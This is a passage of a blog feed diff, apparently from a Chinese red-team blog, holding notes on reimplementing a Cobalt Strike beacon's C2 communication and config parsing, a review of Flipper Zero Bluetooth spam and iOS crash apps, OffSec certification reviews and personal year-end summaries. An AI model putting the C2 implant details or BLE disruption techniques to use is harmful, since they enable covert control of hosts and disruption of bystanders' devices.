+<li>teamserver地址：IP+端口或者域名+端口</li>
+<li>GET请求信息：用来传输心跳包</li>
+<li>POST请求和响应信息：用来传输任务结果</li>
+<li>代理</li>
+<li>睡眠时间及抖动</li>
+</ul>
+<p>可以看出，对于自实现，我们只关注网络通信部分是否能与teamserver保持一致，其他部分都可以不参照原本的beacon实现，具体项目可以参考geacon之类的。</p>
+<h3 id="2-命令执行">2. 命令执行</h3>
+<p>CS的命令执行有3种，<code>shell</code>、<code>execute</code>、<code>run</code></p>
+<p>shell是利用cmd.exe执行，命名管道读取回显的；excute只执行不回显；而run执行且回显。</p>
+<p>执行命令要考虑令牌的问题，runas命令本身就考虑了这个。</p>
+<h3 id="3-beacon运行时的初始化">3. beacon运行时的初始化</h3>
+<p>初始化需要完成以下几个操作：</p>
+<ol>
+<li>申请内存</li>
+<li>异或解密 beacon 配置信息</li>
+<li>解析配置信息</li>
+</ol>
+<p>重点在于这个解析环节，在 teamserver 端，每一项都是用<code>Type-Length-Value</code>的方式来存储的：</p>
+<figure data-type="image" tabindex="44"><img src="https://adan0s-1256533472.cos.ap-nanjing.myqcloud.com/uPic/20250812143444268.png" alt="" loading="lazy"></figure>
+<p>到了beacon端，Type有3种值：<code>1 - Short</code>，<code>2 - Int</code>，<code> 3 - Data</code>，但实际上只有<code>Data</code>的<code>Length</code>用得上，因为<code>Short</code>和<code>Int</code>的长度是已知的。</p>
+<p>这个问题也导致了beacon的配置文件内存区域存在特征，可以被BeaconEye扫描到。</p>
+<p>以及在beacon端，配置信息的结构是这样：</p>
+<figure data-type="image" tabindex="45"><img src="https://adan0s-1256533472.cos.ap-nanjing.myqcloud.com/uPic/20250812143458588.png" alt="" loading="lazy"></figure>
+<p>另外，beacon还有个主机轮换策略，这个我平时很少用，分为四种：</p>
+<ul>
+<li>round-robin：选择按主机名提供的顺序循环遍历主机名列表。每台主机用于一个连接。</li>
+<li>random：选择此项可在每次尝试连接时从列表中随机选择一个主机名。</li>
+<li>failover-xx：选择尽可能长时间地使用工作主机。使用列表中的每个主机，直到它们达到连续故障转移计数 (x) 或持续时间段 (m,h,d)，然后使用下一个主机。</li>
+<li>rotate-xx：选择使用每个主机一段时间。使用列表中的每个主机指定的持续时间 (m,h,d)，然后使用下一个主机。</li>
+</ul>
+<h1 id="0x5-总结">0x5 总结</h1>
+<p>可能你会说：怎么就戛然而止了？因为以上就是之前基本所有的笔记了，从结构上来说肯定是不全的，后续也没继续研究了，凑合看吧。</p>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[斗罢艰险再出发——2024年终总结]]></title>
+        <id>https://red-team.tips/post/PUu40xHjrU/</id>
+        <link href="https://red-team.tips/post/PUu40xHjrU/">
+        </link>
+        <updated>2025-01-05T02:48:09.000Z</updated>
+        <content type="html"><![CDATA[<p>又是一年，我本来是要在31号晚上写这篇总结的，但是刚好朋友酒吧开业，去消费+跨年，喝到了第二天凌晨四点才回来。</p>
+<p>懒得抒情，直接进入总结环节。</p>
+<h1 id="读书">读书</h1>
+<ul>
+<li><strong>《雍正皇帝》</strong> 二月河：还不错，但第三部画风突变，从风云诡谲的皇子夺嫡变成神神鬼鬼的武侠小说，结局更是狗血逆天；</li>
+<li><strong>《雍正王朝》</strong> 刘和平：原著改编的剧本，很多地方比原著处理的好，顺带把电视剧也看了一遍</li>
+<li><strong>《毛泽东自述》</strong> ：教员跟斯诺的聊天记录，值得读；</li>
+<li><strong>《毛泽东诗词全编鉴赏》</strong> ：毛诗中有很多我喜欢的句子，专门买了一本收藏；</li>
+<li><strong>《筚路维艰：中国社会主义路径的五次选择》</strong> ：冯骥推荐，下班回来读到半夜读完的，虽然我不认同作者在某些地方的主观表述态度，但仍然值得读；</li>
+<li><strong>《翦商：殷周之变与华夏新生》</strong> ：作者以“人祭”这一现象的演化，讲中国从新石器时代到周代的历史，包括商周交替以及商周的异同；</li>
+<li><strong>《是，大臣》《是，首相》</strong> 中文实体书：只读了一点，原打算在去英国玩前读完的；</li>
+<li><strong>《忒修斯之船》</strong> 英文实体书：刚买不久，还没看；</li>
+<li><strong>《哈利波特与魔法石》</strong> 英文电子书：还没读完</li>
+<li><strong>《东方快车谋杀案》</strong> 英文电子书：还没读完</li>
+</ul>
+<h1 id="游戏">游戏</h1>
+<ul>
+<li><strong>黑神话·悟空</strong> ：2024最期待的游戏，很满意，已通关；</li>
+<li><strong>High On Life</strong> ：《瑞克与莫蒂》主创贾斯汀·罗兰德为主角手里的枪配音，但因为游戏更新导致中文补丁失效，所以还没打完；</li>
+<li><strong>潜水员戴夫</strong> ：前期好玩，后期重复度太高，通关后就不想打开了；</li>
+<li><strong>极乐迪斯科</strong> ：玩了一点点，剧情有点晦涩，没继续了；</li>
+<li><strong>看门狗军团</strong> ：罐头，主要当伦敦旅游模拟器来玩的；</li>
+<li><strong>最后生还者（美国末日）1重制版</strong> ：很不错的游戏，技术力、剧情、美术、音乐都很棒，二代恶心人不打算玩；</li>
+<li><strong>霍格沃茨之遗</strong> ：上一年没完成的任务，打通关是因为想对同学放阿瓦达；</li>
+<li><strong>漫威蜘蛛侠2</strong> ：值得玩，双主角，还有各种老熟人，<s>什么时候能玩到钢铁侠的3A啊</s></li>
+</ul>
+<h1 id="学习与工作">学习与工作</h1>
+<p>2024没有疯狂考证，主要是倦了，就考了OSED、OSDA，拿到了OSCE<sup>3</sup>，然后开始摆烂。</p>
+<p>上次立的flag有好好学英语，很不幸没完成，直到到年底才开始三天打鱼两天晒网式学习。</p>
+<p>工作方面没什么大变化，仍然在做PM相关，负责的项目更多了。</p>
+<h1 id="其他">其他</h1>
+<p>11月去了伦敦，这是我第一次出国、第一次独自旅行、第一次住青旅、第一次跟陌生人用英语沟通……有太多的第一次。</p>
+<p>以前我不喜欢旅行，觉得去哪儿都麻烦，现在算是打破思想钢印了，明年预计还会再找地方玩。</p>
+<h1 id="2025">2025</h1>
+<p>经典的“计划一时爽，回顾火葬场”，所以这次简化目标：</p>
+<ul>
+<li>时间管理：合理安排，别一边玩还一边焦虑；</li>
+<li>英语：年度重点攻克目标；</li>
+<li>运动：体检查出轻度脂肪肝，必须要逼自己一把了；</li>
+<li>学习：打算考HTB的几个证和CISSP</li>
+</ul>
+<p>其实还有几个目标，暂时不写，有进度了再说。</p>
+<p>最后用一句毛诗来结尾：<strong>今日长缨在手，何时缚住苍龙？</strong></p>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[玩转Flipper Zero之Bluetooth篇]]></title>
+        <id>https://red-team.tips/post/UG49Ltc0l/</id>
+        <link href="https://red-team.tips/post/UG49Ltc0l/">
+        </link>
+        <updated>2024-06-23T02:37:44.000Z</updated>
+        <content type="html"><![CDATA[<h1 id="0x1-前言">0x1 前言</h1>
+<p>最近入手了一个<code>Flipper Zero</code>，打算学习下无线安全领域的知识，顺便记录下一些把玩经验。</p>
+<p>我并没有使用官方固件，而是刷了<code>Momentum</code>：https://momentum-fw.dev/，相比官方固件，它集成了更多的app，开箱即用。</p>
+<p>本篇就介绍下<code>Bluetooth</code>下的各种好玩的app，go!</p>
+<h1 id="0x2-ble-spam">0x2 BLE Spam</h1>
+<p>项目地址：https://github.com/simondankelmann/Bluetooth-LE-Spam</p>
+<p>该项目主要是一个蓝牙滥用相关的app，主要有以下11种子功能：</p>
+<p><strong>1. Kitchen Sink</strong></p>
+<figure data-type="image" tabindex="1"><img src="https://adan0s-1256533472.cos.ap-nanjing.myqcloud.com/uPic/20240623215514POCFKqimage.png" alt="" loading="lazy"></figure>
+<p>这是一个集成功能，相当于会随机利用所有其他子模块的功能，这样就会影响到更多的周围设备（有种看门狗2里大停电的既视感）。</p>
+<p><strong>2. BT Settings Flood</strong></p>
+<figure data-type="image" tabindex="2"><img src="https://adan0s-1256533472.cos.ap-nanjing.myqcloud.com/uPic/202406232155572pPYTOimage.png" alt="" loading="lazy"></figure>
+<p>顾名思义，它会大量生成各种虚假的蓝牙设备，对正准备进行蓝牙配对的人产生干扰，效果如下：</p>
+<figure data-type="image" tabindex="3"><img src="https://adan0s-1256533472.cos.ap-nanjing.myqcloud.com/uPic/20240623215627Opc56Fimage.png" alt="" loading="lazy"></figure>
+<p><strong>3. iOS 17 Lockup Crash</strong></p>
+<figure data-type="image" tabindex="4"><img src="https://adan0s-1256533472.cos.ap-nanjing.myqcloud.com/uPic/20240623215651aOif4jimage.png" alt="" loading="lazy"></figure>
+<p>这个功能可以通过发送特定格式的BLE包，使得iOS 17.2以下的设备被迫重启，不过因为我手头上都是17.5的设备，所以没有测试成功。</p>
+<p><strong>4. Apple Action Modals</strong></p>
+<figure data-type="image" tabindex="5"><img src="https://adan0s-1256533472.cos.ap-nanjing.myqcloud.com/uPic/20240623215716gTABWVimage.png" alt="" loading="lazy"></figure>
+<p>伪造苹果设备的某些操作，可以让iOS设备弹窗，触发距离较长，几米内都能触发：</p>
+<figure data-type="image" tabindex="6"><img src="https://adan0s-1256533472.cos.ap-nanjing.myqcloud.com/uPic/20240623215740f5GiOqimage.png" alt="" loading="lazy"></figure>
+<p><strong>5. Apple Device Popups</strong></p>
+<figure data-type="image" tabindex="7"><img src="https://adan0s-1256533472.cos.ap-nanjing.myqcloud.com/uPic/20240623215758ZfybD6image.png" alt="" loading="lazy"></figure>
+<p>和上一个类似，但这个是会弹类似设备配对时的框，所以需要触发距离很近，差不多30厘米之内才能触发。</p>
+<p><strong>6. Android Device Conn：</strong> 和前面针对苹果设备的类似，需要Google服务，但我手上没安卓设备，所以也没测试</p>
+<p><strong>7. Samsung Buds Popup：</strong> 同上，这个针对三星手机</p>
+<p><strong>8. Samsung Watch Pair：</strong> 弹配对三星手表的框</p>
+<p><strong>9. Windows Device Found：</strong> 这个则是针对开启了Windows快速配对功能，实测开启了会不停弹通知：</p>
+<figure data-type="image" tabindex="8"><img src="https://adan0s-1256533472.cos.ap-nanjing.myqcloud.com/uPic/20240623215825nwQOVkimage.png" alt="" loading="lazy"></figure>
+<p><strong>10. Lovespouse：</strong> 这个比较搞，具体效果可以看：https://www.youtube.com/watch?v=LupcNkiKG_M</p>
+<p>10和11其实都是Lovespouse，但一个时全部开启，另一个则是全部禁用，就不分开说了。</p>
+<h1 id="0x3-bluetooth-remote">0x3 Bluetooth Remote</h1>
+<p>可以将Flipper Zero变成一个有用的蓝牙设备，比如蓝牙鼠标，蓝牙键盘等等。</p>
+<h1 id="0x4-bt-trigger">0x4 BT Trigger</h1>
+<p>和手机配对后，可以远程控制手机拍照，试了下还是挺好使的，虽然想不到使用场景😅</p>
+<h1 id="0x5-findmy-flipper">0x5 FindMy Flipper</h1>
+<p>项目地址：https://github.com/MatthewKuKanich/FindMyFlipper/</p>
+<p>这项目让我有点失望，因为我本来是以为可以直接在&quot;查找我的设备&quot;处实时看到自己Flipper Zero位置的，但用了一下才发现，要实现这种需要先买一个AirTag进行Clone，自行生成的则只能通过接口手动获取，不能直接在你的苹果设备上看到Flipper Zero的位置。</p>
+<h1 id="0x6-pc-monitor">0x6 PC Monitor</h1>
+<p>项目地址：https://github.com/TheSainEyereg/flipper-pc-monitor</p>
+<p>一个用来监测主机各种指标的app，比如CPU占用、内存占用等等，需要在主机端先执行程序，再连接到Flipper Zero，之后打开该应用就能看到了：</p>
+<h1 id="0x7-结语">0x7 结语</h1>
+<p>可以看出，Bluetooth方面的功能主要还是整蛊娱乐为主，都不怎么有实战意义，用来整蛊同事挺好玩的，但小心被打~</p>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[我的OSCE3之路——OSDA]]></title>
+        <id>https://red-team.tips/post/oHLNjm2cX/</id>
+        <link href="https://red-team.tips/post/oHLNjm2cX/">
+        </link>
+        <updated>2024-04-14T02:34:26.000Z</updated>
+        <content type="html"><![CDATA[<!-- more -->
+<h1 id="前言">前言</h1>
+<p><code>OSDA</code>即<code>OffSec Defense Analyst</code>，是一个面向蓝队人员的证书，对应的课程名称为<code>SOC-200(OffSec Foundational Security Operations and Defensive Analysis)</code>，看名字就知道是面向SOC分析师岗位的。</p>
+<p>这一点要吐槽下，国外的蓝队岗位划分比较细，有SOC、DFIR、Threat Hunt等等，国内则是一锅粥，恨不得5000块招一个三头六臂无所不能的进来。</p>
+<p><code>SOC-200</code>使用的SIEM是ELK，有的人觉得不教<code>Splunk</code>简直对不起这个价钱，我倒无所谓，反正<code>OSCP</code>和<code>OSCE3</code>已经值回票价了，剩下再考到都是赚的。</p>
+<h1 id="考试规则">考试规则</h1>
+<p>考试是要求只能用提供的<code>ELK</code>来进行各种操作，例如查询日志、查看告警等，也就是不存在上机排查环节。</p>
+<p>其他的规则和之前一样，不能用chatgpt之类的。</p>
+<p>考试里总共是10个阶段，每个阶段满分10分，会根据你对每个阶段的发现情况给分，总分拿到75分才能通过。</p>
+<p>报告要求：</p>
+<blockquote>
+<p>您需要撰写一份专业报告，包括您收集的所有证据、有关攻击者技术的结论以及每个阶段的妥协方案。您必须记录所有发现结果，包括 SIEM 的所有屏幕截图以及用于确定攻击者操作的任何查询。此外，您必须描述攻击者在每个阶段在网络中获得的访问类型。您的文档应该足够详尽，以便技术上有能力的读者可以逐步复制您的分析。</p>
+</blockquote>
+<h1 id="备考">备考</h1>
+<p>官方给的资源完全够备考，所以不需要额外练习。</p>
+<p>课程材料里前面会根据<code>MITRE ATT&amp;CK</code>的各个阶段进行讲解，后面则会专门教授<code>ELK</code>的使用，以一次事件来完整演示日志调查、告警规则编写这个流程。</p>
+<p>课程提供13个challenge，从简单到复杂，每个challenge都有多个阶段，需要手动启动阶段才会有对应的事件日志。</p>
+<p>challenge是不需要提交flag的，所以一大难点就是你不知道自己是否完全找到了该阶段的所有内容，这一点和真实工作很像。不过也有技巧，就是用启动每个阶段的时间来帮你把范围缩小，不然海量的日志能让你找到头晕。</p>
+<p>另外challenge里的预置规则很少，基本都需要通过日志来分析行为，当然你可以自己导入规则，这在考试中也是允许的，不过根据我的实际经验来看，没这个必要。</p>
+<p>备考OSDA花的时间很短，不到一个月，因为我只重点看了ELK使用介绍的部分，然后就开始challenge了。因为工作忙，直到考试前一晚我才做完第12个，最后一个就没做。</p>
+<p>这门课程提供了专门的challenge讲解视频，可能是为了照顾新手，还是直播讲的，能够听到讲师与听众的互动。不过讲课程的估计是个印度哥们，口音有点奇怪，再加上讲的很磨叽，我就基本没看。</p>
+<p>OffSec的discord里提供了SOC-200课程challenge的hint bot，如果遇到困难或者想确认自己是不是找到了所有内容，就可以去看看。</p>
+<h1 id="考试">考试</h1>
+<p>这次考试算是压力最小的一次了，虽然只有24小时，但完全够用。</p>
+<p>考试总共有10个阶段，也给了一些预置规则，这些规则很有用，基本算是提示了。</p>
+<p>我从早上8点开始，中间遇到过一些小插曲耽误了点时间，到下午6点就全部做完了，个人认为所有攻击内容都找到了，应该没有遗漏的。</p>
+<p>然后就是写报告，这次没用官方的Word模板，因为做的真的是依托史，我连改都不想改，最后用github上的markdown模板做的。</p>
+<p>最终在凌晨1点提前结束了考试，报告写了近50页，里面大概放了100张图片，检查了几遍后就交了报告。<br>
+一些考试经验：</p>
+<ul>
+<li>考试环境不是非常稳定，万一发现找不到应该找的日志，就重置。只不过重置很费时间，尤其是打到后面几个阶段，每次重置要十几分钟，还要再花时间一个阶段一个阶段走过去，基本上得一小时起步</li>
+<li>每次启动阶段的时间可以记录下来，这是防止后面你突然发现某个攻击环节明显缺信息了，还能根据时间再回去找，不必重置环境</li>
+<li>每个阶段里的事件数量不是固定的，有可能是多个，有可能只有一个，所以如果找不到别的痕迹就直接开始下一个阶段吧</li>
+<li>考试不要求写检测规则，只需要把你找到的攻击者的手法描述清楚就行，贴上截图、所用到的KQL语句等，不需要把每个查询都写上，稍微复杂点的（有多个过滤或限定条件）写上就行</li>
+</ul>
+<h1 id="小结">小结</h1>
+<p>4月5号凌晨1点提交了报告，4月8号早上起来就看到了通过的邮件，速度还是挺快的。</p>
+<figure data-type="image" tabindex="1"><img src="https://adan0s-1256533472.cos.ap-nanjing.myqcloud.com/uPic/20240414140028qcGNIkimage.png" alt="" loading="lazy"></figure>
+<p>还剩一个<code>OSMR</code>，但是我不想继续考了，已经考麻了，反正macOS的安全和我的工作相关不大，未来也大概率不会做这方面的研究，所以就放弃好了，好好休息下，剩下的时间看看新出的几个<code>Learn Path</code>，一年的OffSec之旅就这样结束吧。</p>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[我的OSCE3之路——OSED]]></title>
+        <id>https://red-team.tips/post/oxqLv6NzK/</id>
+        <link href="https://red-team.tips/post/oxqLv6NzK/">
+        </link>
+        <updated>2024-03-13T02:23:06.000Z</updated>
+        <content type="html"><![CDATA[<!-- more -->
+<h1 id="前言">前言</h1>
+<p><code>OSED</code>对应的课程为<code>EXP-301(Windows User Mode Exploit Development)</code>，从名字就可以看出，这是一门Windows平台漏洞利用的课程，简单来说就是Windows Pwn.</p>
+<p><code>EXP-301</code>的主要内容是Windows下32位的漏洞利用，很多人认为在现在的环境下还教32位有点过时，但这门课并不是进阶课程，而是Pwn的入门课程，所以用32位其实没什么不妥，真正高阶的<code>Exploit Development</code>课程应该看<code>EXP-401</code>.</p>
+<p>官方给的前置技能要求包括：</p>
+<ul>
+<li>熟悉调试器</li>
+<li>熟悉32位漏洞利用的基本概念</li>
+<li>能够熟练编写Python3代码</li>
+<li>能够基本阅读和理解C代码</li>
+<li>能够基本阅读和理解基础的汇编代码</li>
+</ul>
+<h1 id="考试规则">考试规则</h1>
+<p><code>OSED</code>考试同样为48小时，同样需要监考和提交报告。考试总共会出现3道题目，其中两道为30分，一道为40分，获得60分即可通过。</p>
+<p>考试中不能使用商业工具、AI聊天机器人（chatgpt类），并且必须使用<code>IDA Free</code>和<code>WinDBG</code>完成逆向调试，不能使用其他的调试或者反编译工具，比如<code>Ghidra</code>、<code>IDA Pro</code>、<code>x32dbg</code>等。这一点很多人不喜欢，因为WinDBG的指令确实反人类，OffSec官方说这样要求是为了保证评分流程的流畅。</p>
+<p>可以使用WinDBG的插件或者扩展，但需要在报告里说明其用途；可以使用漏洞利用编写框架，例如<code>pwntools</code>、<code>mona</code>等。</p>
+<p>考试所写的脚本必须是<code>Python3</code>的，可以使用<code>Metasploit</code>社区版作为辅助。</p>
+<p>另外要注意的是，<code>OSED</code>考试所需报告的要求也是有变化的，脚本需要单独作为文件而不是放在PDF中。</p>
+<p>只要完成其中两个题目就可以通过考试，必须完全解决才能得分，不会给步骤分。</p>
+<p>和<code>OSWE</code>类似，<code>OSED</code>考试同样严禁下载考试文件到本地。除非考试说明特别要求，即使这样也需要在考试结束时删除该文件。</p>
+<h1 id="备考">备考</h1>
+<p><code>EXP-301</code>的课程板块相对来说没那么多，主要就是这些：</p>
+<ul>
+<li>WinDbg使用介绍</li>
+<li>基础堆栈溢出</li>
+<li>SEH溢出</li>
+<li>Egghunters</li>
+<li>Custom Shellcode</li>
+<li>DEP绕过</li>
+<li>ASLR绕过</li>
+<li>格式化字符串</li>
+</ul>
+<p>看了其他人的review以及考试说明，提到题目一般是3个类型：</p>
+<ul>
+<li>给Crash PoC的DEP Bypass，ROP必须多练，一定掌握熟</li>
+<li>Custome Shellcode，会指定你需要通过哪个函数达成什么效果</li>
+<li>对逆向能力要求高的压轴题</li>
+</ul>
+<p>压轴题都说很难，做出来的人不多，因为不做也能通过考试。</p>
+<p>因为就剩最后一门了，所以有点松懈，加上备考中间遇到了春节，最终学习时间其实很少。</p>
+<p>输人不输阵，还是约了3月8号的考试，要这么急匆匆考的原因还是，剩下的时间还想再学个OSMR（macOS上的本地提权及绕过操作系统防御机制）或者OSDA（安全分析师路径）的，必须狠狠榨取剩余价值。</p>
+<p>根据剩余时间和考试内容的综合考虑，我选择放弃最后的压轴题，目标就是把前两个类型掌握熟练。</p>
+<p><code>EXP-301</code>总共有三个challenge，第二个主要考察DEP绕过+ROP，第一个和第三个都需要一些逆向工作。因为时间和工作原因，没来得及做challenge，只能把课程材料多熟悉了几遍。</p>
+<p>收集了一些有用的资源，包括review和工具：</p>
+<ul>
+<li>https://red.0xbad53c.com/training-reviews/offensive-security/osed</li>
+<li>https://darkwing.moe/2022/10/07/OSED%E5%8F%97%E9%A8%93%E8%A8%98/</li>
+<li>https://github.com/epi052/osed-scripts</li>
+<li>https://github.com/0xbad53c/osed-tools</li>
+<li>https://github.com/nop-tech/OSED</li>
+<li>https://github.com/nop-tech/code_caver</li>
+</ul>
+<p>还有一些额外的自制小练习，来自<code>@y4ng</code>师傅：</p>
+<p><strong>自定义shellcode：</strong></p>
+<ul>
+<li>CreateProcess执行calc.exe</li>
+<li>WinExec执行calc.exe</li>
+<li>CreateServiceA创建一个服务</li>
+<li>GetUserNameA + MessageboxA 弹出&quot;Hello 用户名&quot;</li>
+<li>GetUserNameW + MessageboxW 弹出&quot;主机名 用户名&quot;</li>
+</ul>
+<p><strong>ROP:</strong></p>
+<ul>
+<li>github.com/xct/vulnbins</li>
+<li>exploits/50472 10-Strike Network Inventory Explorer</li>
+<li>exploits/17665 D.R. Software Audio Converter 8.1</li>
+<li>exploits/44522 exploits/47411 Easy File Sharing Web Server 7.2</li>
+<li>exploits/46269 Faleemi Desktop Software 1.8</li>
+<li>exploits/50650 vuplayer 2.49</li>
+<li>exploits/43156 VX Search 10.2.14</li>
+</ul>
+<!-- more -->
+<h1 id="考试">考试</h1>
+<p>毫不夸张地说，OSED是我目前遇到的最难的OffSec考试。</p>
+<p>当天还出现个状况，进入监考平台后我没法看到监考员发的信息，我也发不出去信息，最后靠挂全局代理解决了。</p>
+<p>题目要求写的很清楚，要求必须用什么以及不能用什么，另外就是记得提交时每道题只能交一个脚本，如果你有多个脚本就需要合并起来。</p>
+<p>第一道是DEP Bypass+ROP题，期间踩坑无数，很多东西现查现学，不断冒出想放弃的念头。还好慢慢进入了状态，最终在考试开始后近30小时解决了它，而第二道自定义shellcode要相对简单一些，大概花了6个小时，做完就开始写报告，也写了5个多小时。</p>
+<p>这次的报告也是最长的，写了近70页，把每个步骤和环节都尽量写的详细，然后提前6个小时结束考试并提交了报告，当时已经是凌晨五点，将近20个小时没休息，倒头就睡了。</p>
+<p>对于考试，还有一些经验：</p>
+<ul>
+<li>ROP非常重要，练得越多，你的ROP就越熟练，遇到一些限制环境也能找到另外的构造思路</li>
+<li>常见汇编指令要熟悉，不然想要实现某个功能却不知道用什么指令，那真是没地方哭</li>
+<li>每种题目要针对性地多练练，常见的坑就能提前踩好</li>
+<li>做好文档和脚本的管理，考试中我因为用混了没改的脚本导致浪费好长时间</li>
+<li>有时候仅能用的gadget会有副作用，比如让你的堆栈产生各种变化，要学会怎么消除它们</li>
+</ul>
+<p>又是无比漫长的等待，这次等待的感觉已经接近于OSCP的那回，因为看到频道里很多人都是交报告24小时内就结果，整个人就是急急急。</p>
+<figure data-type="image" tabindex="1"><img src="https://adan0s-1256533472.cos.ap-nanjing.myqcloud.com/uPic/20240313201643OITgKl1662521809258362.jpg" alt="" loading="lazy"></figure>
+<p>还好这次速度也很快，大概在交完报告的第二天晚上就出了结果。当时的我正在和朋友聊天，手机突然传来叮的一声，这是推送软件的声音提醒，只有当考试结果通过时才会响起。</p>
+<p>我愣了一下，才反应过来我已经通过了OSED，也就完成了获得OSCE3的最后一项认证。</p>
+<p>近10个月的不断学习，我终于获得了<code>OffSec Certified Expert 3 (OSCE3)</code>，这一刻真有种如释重负的感觉。突然就想起来刚开始学习OffSec证书时，在某个人的OSCP review里看到的一句话：<strong>这不是短跑，而是一场马拉松。</strong></p>
+<h1 id="小结">小结</h1>
+<figure data-type="image" tabindex="2"><img src="https://adan0s-1256533472.cos.ap-nanjing.myqcloud.com/uPic/202403132017223wehbQimage.png" alt="" loading="lazy"></figure>
+<p>拿到OSCE3的电子证书后，还有一封邮件，是需要确认邮寄纸质证书及纪念币的地址，比较坑的是邮件里的链接点开就302，需要发邮件给他们的order部门处理下。</p>
+<p>地址先填英文版的，等到了国内之后再改为中文版方便派送。证书会通过DHL寄送，基本是一批一批发的，最长需要两个月左右的时间，就慢慢等吧。</p>
+<p>我的LU订阅还有两个月到期，争取把OSDA和OSMR也拿下，那这次的钱就花的太值辣😁</p>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[2023年终总结]]></title>
+        <id>https://red-team.tips/post/2mrt_3sfo/</id>
+        <link href="https://red-team.tips/post/2mrt_3sfo/">
+        </link>
+        <updated>2024-01-01T14:41:31.000Z</updated>
+        <content type="html"><![CDATA[<h1 id="生活">生活</h1>
+<p>今年搬了一次家，这次的房间更小，但装修更好了，总体来说还算满意。</p>
+<p>年中的时候，购入了PS5，开始主机游戏之旅。到目前为止，通关了：</p>
+<ul>
+<li>对马岛之魂导演剪辑版</li>
+<li>蜘蛛侠：迈尔斯·莫拉雷斯</li>
+<li>神秘海域：盗贼传奇合辑（没玩DLC）</li>
+<li>赛博朋克2077（没玩DLC）</li>
+</ul>
+<p>打了一部分然后没继续的有：</p>
+<ul>
+<li>瑞奇与叮当：时空跳转（一开始演出效果很惊艳，后期同质化高缺乏乐趣）</li>
+<li>看门狗：军团（这代太无聊）</li>
+<li>星际拓荒（好游戏，没来得及玩）</li>
+<li>控制（视觉效果挺好的，就是无聊）</li>
+<li>巫师三次世代版（没来得及玩）</li>
+</ul>
+<p>目前在玩霍格沃兹之遗，总体来说是个粉丝向游戏，有点罐头，但对于哈迷来说是诚意满满。</p>
+<p>今年对我来说是安定的一年，换句话说就是没什么新意，工作日朝九晚六，周末宅家里。</p>
+<p>锻炼的习惯依然没有养成，这是非常遗憾的一点。</p>
+<h1 id="工作">工作</h1>
+<p>工作方面，今年没有离职，还逐渐转型成了PM，虽然和我的意愿有差异，不过也学到了很多东西。</p>
+<p>今年公司的团队有了很大进步，一些同事也能逐渐独当一面了。拿到了一些小成绩，比如某省的演练第一之类的。</p>
+<p>当然，距离合格的团队还有很大距离，新的一年继续努力建设吧。</p>
+<h1 id="学习">学习</h1>
+<p>今年从五月份开始考证，总共拿到了OffSec的3个证书，每次备考和考试都是一段忙碌的旅程。</p>
+<p>其他的技术方面就没有太多进步了，工作和考证就已经挤占了大部分时间。</p>
+<p>年末开始用多邻国学英语，仅靠它的强度太低了，完全不能满足需求，只能作为培养学习习惯用。</p>
+<h1 id="新的一年">新的一年</h1>
+<p>又到了一年一度立flag的时间了，新的一年我想做到这些：</p>
+<ul>
+<li>拿到OSCE3</li>
+<li>雅思拿到6.5+</li>
+<li>开发和维护一款自己的安全工具</li>
+<li>自己旅行一次</li>
+<li>读完十本非技术书籍</li>
+<li>养成定期锻炼的习惯</li>
+</ul>
+<blockquote>
+<p>Talk is cheap, just wait and see.</p>
+</blockquote>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[我的OSCE3之路——OSWE]]></title>
+        <id>https://red-team.tips/post/hfHBw5hIv/</id>
+        <link href="https://red-team.tips/post/hfHBw5hIv/">
+        </link>
+        <updated>2023-12-20T10:47:32.000Z</updated>
+        <content type="html"><![CDATA[<h1 id="前言">前言</h1>
+<p><code>OSWE</code>对应的课程为<code>WEB-300(Advanced Web Attacks and Exploitation)</code>，主要考察白盒代码审计，所涉及的语言和框架也不止一种，有<code>PHP</code>、<code>Java</code>、<code>.NET</code>等。</p>
+<p><code>WEB-300</code>我个人认为是300级课程中<s>难度最低</s>的一个，原因是相比<code>PEN-300</code>，随机性更小；而<code>EXP-301</code>是我基本不懂的二进制领域。</p>
+<h1 id="考试规则">考试规则</h1>
+<p>相比<code>OSCP</code>和<code>OSEP</code>，<code>OSWE</code>的考试严格约定了<strong>不允许下载源码到本地</strong>这一规则，我想这还是因为考试保密的要求，因为<code>OSWE</code>的考试核心就是源码，拿到了就能复制一个考试环境出来，<code>OSCP</code>及<code>OSEP</code>是做不到这一点的。</p>
+<p>同时，也不能使用源代码分析器，无论是商用的还是开源的或者自己写的，CodeQL、tabby这种都不可以，意味着必须手动去发现漏洞。</p>
+<p>另外，不能使用自动利用工具（sqlmap等）、漏洞扫描器（Nessus等）、chatgpt类AI、远程文件管理工具（sshfs、sftp等）。</p>
+<p>看其他人的review，说到考试中总共会给5台机器：</p>
+<ul>
+<li>测试机一台：一般是Kali，通过这台跑脚本速度更快；</li>
+<li>调试机两台，给系统登录权限，运行了目标应用，上面没有flag，配置了VSCode、JD-GUI等工具；</li>
+<li>目标机两台，有flag，没有登录权限，其他部分都和测试机一样。</li>
+</ul>
+<p>考试中总共会给两台目标，分别需要完成权限认证绕过和RCE，最少需要85分才能通过考试，官方并没有在<code>Exam Guide</code>中确认每一项的分数是多少，但按照很多人的经验，至少需要完全完成其中一台机器，及完成另一台的身份认证绕过（这一点可能要在考试时得到的<code>Specific Instructions</code>中确认）。</p>
+<p>最终需要提交一个PDF，其中要包含整个漏洞利用链的描述，并将整个漏洞利用脚本放入，漏洞利用脚本需要在<strong>不经过用户交互</strong>的情况下获取flag文件，你可以选择反弹shell回来然后手动读取flag，并且不需要在脚本里实现接收shell，即：你可以在另外的窗口手动打开nc监听，只需要在报告里说明所用的命令即可：</p>
+<figure data-type="image" tabindex="1"><img src="https://adan0s-1256533472.cos.ap-nanjing.myqcloud.com/uPic/20231220184910NtgeBHDXLSqW.jpg" alt="20231220184910NtgeBHDXLSqW" loading="lazy"></figure>
+<h1 id="备考">备考</h1>
+<p>我本身虽然对大部分Web漏洞的原理和利用都足够了解，但基本上没有尝试过白盒审计的方式来学习和实践。</p>
+<p>因为考试需要自行写脚本来达到目的，所以一门脚本语言是必须的（只要你想，用Java来写也不是不行），我就选择了自己最熟悉的Python，其他的如<code>requests</code>库这些都需要熟练掌握。</p>
